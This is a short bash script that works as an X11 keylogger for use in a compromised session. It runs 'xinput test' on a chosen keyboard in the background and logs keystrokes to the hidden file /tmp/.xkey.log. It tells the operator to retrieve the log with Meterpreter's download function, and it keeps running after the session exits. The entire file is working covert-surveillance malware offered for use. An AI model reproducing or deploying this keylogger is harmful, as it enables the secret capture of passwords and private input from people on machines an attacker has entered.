#!/bin/bash
export DISPLAY=:0.0
xinput list
echo -e "KBD ID ?"
read kbd 
xmodmap -pke > /tmp/.xkey.log
script -c "xinput test $kbd" | cat >> /tmp/.xkey.log & 
echo "The keylog can be downloaded from /tmp/.xkey.log" 
echo "Use the meterpreter download function" 
echo "Press CTLR+C to exit this session, keylogger will run in backround"
exit 
